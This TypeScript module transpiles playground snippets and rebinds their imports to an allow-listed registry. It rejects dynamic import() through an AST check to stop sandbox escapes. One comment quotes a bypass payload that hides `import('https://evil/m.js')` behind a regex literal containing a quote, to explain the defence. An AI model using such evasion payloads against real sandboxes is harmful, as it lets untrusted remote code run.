/**
 * R2 — Transpile step for the browser runner pipeline (SANDBOX.md §5 step 1).
 *
 * Strips TypeScript + JSX (erasure only, no type-checking — REQUIREMENTS.md §5)
 * and returns runnable JS.  Both transpilers are lazy-loaded so prose pages pay
 * nothing (NFR1).
 *
 * Primary:  Sucrase  (`transform(code, { transforms: ['typescript','jsx'] })`)
 * Fallback: @babel/standalone  (if Sucrase fails to *load* — engine/internal error)
 *
 * NOTE the transform list intentionally OMITS Sucrase's `imports` transform: the
 * snippet runs as an `AsyncFunction` body where every name it may use is injected
 * as a parameter and there is NO module loader (`require` is `undefined`, SEC-31).
 * So an `import` must be *erased* and rebound to the injected scope, never
 * rewritten to `require(...)` (that is the "require is not a function" crash). A
 * shared final pass ({@link rebindModuleImports}) rebinds each ESM `import` to the
 * curated in-worker registry (`__stitchImport`, wired by worker-entry) and rejects
 * dynamic `import()` (an SEC-31 module-loader escape).
 *
 * Transpile *syntax* errors from the snippet are returned as
 * `{ error: RunError(phase:'transpile') }` — they never throw (FR6, CodeRunner contract).
 */
import type { RunError } from '../component/runner';

/* -------------------------------------------------------------------------- */
/*  Public API                                                                 */
/* -------------------------------------------------------------------------- */

export interface TranspileOptions {
    /**
     * Which transpiler to prefer.  Defaults to `'sucrase'`.
     * Pass `'babel'` to skip Sucrase and go straight to @babel/standalone —
     * useful for callers that already know Sucrase failed to load (NFR4).
     */
    transpiler?: 'sucrase' | 'babel';

    /**
     * Escape hatch for unit-testing: inject a synchronous transform function
     * so the test never needs the real transpiler packages installed.
     * When provided, `transpiler` is ignored and the injected fn is called
     * directly.  The fn must throw on syntax errors (just like the real libs).
     */
    _transform?: (code: string) => string;
}

export type TranspileResult = { js: string } | { error: RunError };

/**
 * Transpile `code` (TS + JSX) to runnable JS.
 *
 * - Returns `{ js }` on success.
 * - Returns `{ error }` on any transpile failure — never throws for snippet
 *   syntax errors.
 * - May throw only on truly unrecoverable harness bugs (e.g. neither transpiler
 *   could be dynamically imported and the injected fallback is absent) — callers
 *   that wish to be bullet-proof should catch and map to `reason:'internal'`.
 */
export async function transpile(
    code: string,
    opts: TranspileOptions = {},
): Promise<TranspileResult> {
    const base = await transpileBase(code, opts);
    // Type/JSX erasure done — now erase & rebind ESM imports to the injected
    // scope (shared across every transpiler path, incl. the unit-test hatch).
    return 'error' in base ? base : await rebindModuleImports(base.js);
}

/** Erase TS + JSX only. Imports are handled downstream by rebindModuleImports. */
async function transpileBase(
    code: string,
    opts: TranspileOptions,
): Promise<TranspileResult> {
    const { transpiler = 'sucrase', _transform } = opts;

    /* -- injected transform (unit-test path) -------------------------------- */
    if (_transform) {
        return applyTransform(code, _transform);
    }

    /* -- Babel-first shortcut (caller opted in) ----------------------------- */
    if (transpiler === 'babel') {
        return transpileWithBabel(code);
    }

    /* -- Default: Sucrase, with Babel as load-failure fallback -------------- */
    return transpileWithSucrase(code).catch((loadErr) => {
        // Only fall back when Sucrase itself failed to *load* (internal error).
        // A syntax error from the snippet is already returned as { error } by
        // transpileWithSucrase and will never reach here.
        if (loadErr instanceof TranspilerLoadError) {
            return transpileWithBabel(code);
        }
        throw loadErr;
    });
}

/* -------------------------------------------------------------------------- */
/*  Internal helpers                                                           */
/* -------------------------------------------------------------------------- */

/** Sentinel so we can distinguish "dep didn't load" from "snippet is broken". */
class TranspilerLoadError extends Error {
    constructor(cause: unknown) {
        super(
            'Failed to load transpiler (engine/internal error)',
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            { cause } as any,
        );
        this.name = 'TranspilerLoadError';
    }
}

/**
 * Run `transformFn(code)`, catch syntax errors from the snippet, and map them
 * to a `RunError` with `phase:'transpile'`.  This is the shared "apply +
 * error-map" logic used by all paths.
 */
function applyTransform(
    code: string,
    transformFn: (code: string) => string,
): TranspileResult {
    try {
        const js = transformFn(code);
        return { js };
    } catch (err) {
        return { error: mapToRunError(err) };
    }
}

/** Map any thrown value to a `RunError` with `phase:'transpile'`. */
function mapToRunError(err: unknown): RunError {
    if (err instanceof Error) {
        const e = err as Error & {
            line?: number;
            col?: number;
            column?: number;
        };
        return {
            name: e.name || 'TranspileError',
            message: e.message,
            stack: e.stack,
            phase: 'transpile',
            // Both Sucrase and Babel expose line/col(umn) on the error object.
            line: typeof e.line === 'number' ? e.line : undefined,
            column:
                typeof e.col === 'number'
                    ? e.col
                    : typeof e.column === 'number'
                      ? e.column
                      : undefined,
        };
    }
    return {
        name: 'TranspileError',
        message: String(err),
        phase: 'transpile',
    };
}

/* -- Sucrase ---------------------------------------------------------------- */

async function transpileWithSucrase(code: string): Promise<TranspileResult> {
    // Lazy-load so prose pages pay nothing (NFR1).
    let transform: typeof import('sucrase').transform;
    try {
        const sucrase = await import('sucrase');
        transform = sucrase.transform;
    } catch (e) {
        throw new TranspilerLoadError(e);
    }

    return applyTransform(
        code,
        (src) =>
            // No `imports` transform — see the file header: imports are erased and
            // rebound to the injected scope by rebindModuleImports, not rewritten
            // to `require(...)`. Sucrase's typescript pass already elides
            // `import type` and inline `type` specifiers, leaving only value
            // imports for the rebinder.
            transform(src, {
                transforms: ['typescript', 'jsx'],
            }).code,
    );
}

/* -- @babel/standalone ------------------------------------------------------
 * Babel's browser build is a UMD that exposes a global `Babel`.  When loaded
 * as an ES module via dynamic import, we get its default export or the named
 * `transform` export depending on the bundler.  We handle both shapes.
 * -------------------------------------------------------------------------*/

async function transpileWithBabel(code: string): Promise<TranspileResult> {
    // Lazy-load so prose pages pay nothing (NFR1).
    let babelTransform: typeof import('@babel/standalone').transform;
    try {
        // @babel/standalone exposes `transform` as a named export (and on
        // the default export when accessed via a bundler).
        const babel = await import(
            /* webpackIgnore: true */ '@babel/standalone'
        );
        babelTransform =
            // named export (ESM build / bundler interop)
            babel.transform ??
            // default export fallback (UMD-in-ESM wrapper)
            (
                babel as unknown as {
                    default: { transform: typeof babelTransform };
                }
            ).default?.transform;

        if (typeof babelTransform !== 'function') {
            throw new Error('Babel transform function not found on module');
        }
    } catch (e) {
        throw new TranspilerLoadError(e);
    }

    return applyTransform(code, (src) => {
        const result = babelTransform(src, {
            presets: ['typescript', 'react'],
            filename: 'snippet.tsx',
        });
        if (!result.code) {
            throw new Error('Babel produced no output');
        }
        return result.code;
    });
}

/* -- ESM import rebinding ---------------------------------------------------
 * The snippet runs as an `AsyncFunction` body: its identifiers resolve to the
 * scope names worker-entry injects (`stitch`, `bearer`, …), and there is no
 * module loader — `require` is `undefined` (SEC-31). This pass takes the
 * type/JSX-erased JS and:
 *   1. rejects dynamic `import()` (it would reach a real loader in the Worker),
 *   2. rewrites each static `import` into `const … = __stitchImport('<spec>')`
 *      destructuring, and
 *   3. strips `export` (a snippet returns its last value; exports never ran).
 * `__stitchImport` is the curated registry worker-entry binds into scope; only
 * allow-listed specifiers (`stitchapi`, `zod`) resolve, everything else throws.
 * -------------------------------------------------------------------------*/

/** The scope-injected module registry a rebound import calls. */
const IMPORT_REGISTRY = '__stitchImport';

/**
 * The message shown when a snippet reaches for a real module loader. Shared by the
 * dynamic-`import()` rejection and the fail-closed "couldn't verify" path.
 */
const NO_DYNAMIC_IMPORT_MESSAGE =
    "Dynamic import() isn't available in the playground. " +
    "Everything from 'stitchapi' is already in scope; use a static " +
    "`import { … } from 'stitchapi'` (or 'zod') instead.";

/** Minimal shape of the acorn ESTree nodes we walk. */
type AstNode = { type?: string; [key: string]: unknown };

// Keys that never hold child AST nodes — skip them so the walk doesn't wander into
// position metadata (`loc`/`range`/`start`/`end`) or the source of a `raw` literal.
const NON_CHILD_KEYS = new Set(['type', 'start', 'end', 'loc', 'range', 'raw']);

/**
 * True if the AST contains a dynamic `import(...)` — an ESTree `ImportExpression`
 * node. Depth-first over every child node/array. `import.meta` is a `MetaProperty`
 * and a `foo.import(x)` call is a `MemberExpression`, so neither is an
 * `ImportExpression` and neither false-positives; a static `import … from …` is an
 * `ImportDeclaration` (rewritten below), also not matched here.
 */
function astHasImportExpression(root: AstNode): boolean {
    const stack: unknown[] = [root];
    while (stack.length > 0) {
        const node = stack.pop();
        if (Array.isArray(node)) {
            for (const child of node) stack.push(child);
            continue;
        }
        if (!node || typeof node !== 'object') continue;
        const n = node as AstNode;
        if (n.type === 'ImportExpression') return true;
        for (const key in n) {
            if (NON_CHILD_KEYS.has(key)) continue;
            const value = n[key];
            if (value && typeof value === 'object') stack.push(value);
        }
    }
    return false;
}

function importError(message: string): TranspileResult {
    return {
        error: { name: 'UnsupportedImportError', message, phase: 'transpile' },
    };
}

/**
 * Reject a dynamic `import(...)` before the static-import rewrite runs — SEC-31/
 * SEC-04: a surviving dynamic import reaches a REAL module loader in the Worker and
 * loads remote code.
 *
 * Detection is AST-based (acorn), NOT a text scan. A lexical/regex gate over the
 * transpiled source is defeated by trivia the scanner mis-reads: the prior
 * comment/string-blanking lexer did not track regex literals, so a regex carrying
 * an unbalanced quote — `const re = /'/; import('https://evil/m.js')` — desynced
 * its string state and blanked the real `import(`, letting the escape through. An
 * `ImportExpression` node cannot be hidden that way: comments, strings, template
 * literals, and regex literals are all resolved by the parser.
 *
 * Returns a `{ error }` result to reject (a real dynamic import, or — fail-CLOSED —
 * an anomalous acorn load/parse failure: this `js` is post-transpile output Sucrase
 * already accepted, so if we cannot parse it we must not pass it through), else
 * `undefined`. Never throws — `transpile()` is contractually no-throw (SEC-39b).
 */
async function rejectDynamicImport(
    js: string,
): Promise<TranspileResult | undefined> {
    let hasDynamicImport: boolean;
    try {
        // Lazy-load, mirroring the transpilers (NFR1). acorn is a small, standalone
        // ESTree parser — it only reads, never transforms.
        const { parse } = await import('acorn');
        const ast = parse(js, {
            ecmaVersion: 'latest',
            sourceType: 'module', // the js still carries static import/export
            allowReturnOutsideFunction: true, // snippet body is wrapped later
            allowAwaitOutsideFunction: true,
        }) as unknown as AstNode;
        hasDynamicImport = astHasImportExpression(ast);
    } catch {
        // Anomalous — Sucrase already validated this js. Fail closed.
        return importError(NO_DYNAMIC_IMPORT_MESSAGE);
    }
    return hasDynamicImport
        ? importError(NO_DYNAMIC_IMPORT_MESSAGE)
        : undefined;
}

async function rebindModuleImports(js: string): Promise<TranspileResult> {
    // (1) Reject dynamic import() before the static rewrite strips `import`
    // keywords — SEC-31/SEC-04. Detected from the acorn AST (rejectDynamicImport),
    // so no text/regex trickery — a wedged comment, a string, or a quote-bearing
    // regex literal — can hide the call from the gate.
    const rejected = await rejectDynamicImport(js);
    if (rejected) {
        return rejected;
    }

    let out = js;

    // (2a) `import <clause> from '<spec>';` → const bindings from the registry.
    // The lazy `[\s\S]*?` lets a multi-line clause span newlines up to `from`.
    out = out.replace(
        /^[ \t]*import\b([\s\S]*?)\bfrom\s*(['"])([^'"]+)\2[ \t]*;?/gm,
        (_m, clause: string, _q: string, spec: string) =>
            emitImportBindings(clause, spec),
    );

    // (2b) side-effect `import '<spec>';` → validate the module, bind nothing.
    out = out.replace(
        /^[ \t]*import\s*(['"])([^'"]+)\1[ \t]*;?/gm,
        (_m, _q: string, spec: string) =>
            `${IMPORT_REGISTRY}(${JSON.stringify(spec)});`,
    );

    // (3) Strip `export` — snippets can't export from a function body, and these
    // never worked before (they compiled to writes on an undefined `exports`).
    out = out
        .replace(/^[ \t]*export\s+default\s+/gm, '')
        .replace(
            /^[ \t]*export\s*\{[^}]*\}[ \t]*(from\s*['"][^'"]+['"])?[ \t]*;?/gm,
            '',
        )
        .replace(/^[ \t]*export\s*\*[^;\n]*;?/gm, '')
        .replace(
            /^([ \t]*)export\s+(?=(?:const|let|var|function|class|async|abstract|enum)\b)/gm,
            '$1',
        );

    return { js: out };
}

/**
 * Turn an import clause into `const` bindings that read from the registry, e.g.
 *   `{ a, b as c }`   → `const { a, b: c } = __stitchImport('m');`
 *   `* as ns`         → `const ns = __stitchImport('m');`
 *   `Def, { a }`      → `const Def = __stitchImport('m').default; const { a } = …`
 * A stray `type X` specifier (Babel path may keep it) is dropped. The registry
 * call is side-effect-free, so repeating it for the default + named case is fine.
 */
function emitImportBindings(clauseRaw: string, spec: string): string {
    const call = `${IMPORT_REGISTRY}(${JSON.stringify(spec)})`;
    const parts: string[] = [];
    let clause = clauseRaw.trim();

    // Named group: `{ a, b as c }`.
    const named = clause.match(/\{([\s\S]*)\}/);
    if (named) {
        const pairs = named[1]
            .split(',')
            .map((s) => s.trim())
            .filter(Boolean)
            .filter((s) => !/^type\s/.test(s))
            .map((s) => {
                const alias = s.match(/^(\S+)\s+as\s+(\S+)$/);
                return alias ? `${alias[1]}: ${alias[2]}` : s;
            });
        parts.push(
            pairs.length
                ? `const { ${pairs.join(', ')} } = ${call};`
                : `${call};`,
        );
        clause = clause.replace(named[0], '');
    }

    // Whatever remains is a default import and/or `* as ns` (comma-separated).
    for (const tok of clause
        .split(',')
        .map((s) => s.trim())
        .filter(Boolean)) {
        const ns = tok.match(/^\*\s+as\s+(\S+)$/);
        if (ns) {
            parts.push(`const ${ns[1]} = ${call};`);
        } else if (/^[A-Za-z_$][\w$]*$/.test(tok)) {
            parts.push(`const ${tok} = ${call}.default;`);
        }
    }

    // `import {} from 'm'` / unparseable clause: still resolve the module so an
    // unknown specifier errors rather than silently vanishing.
    return parts.length ? parts.join(' ') : `${call};`;
}
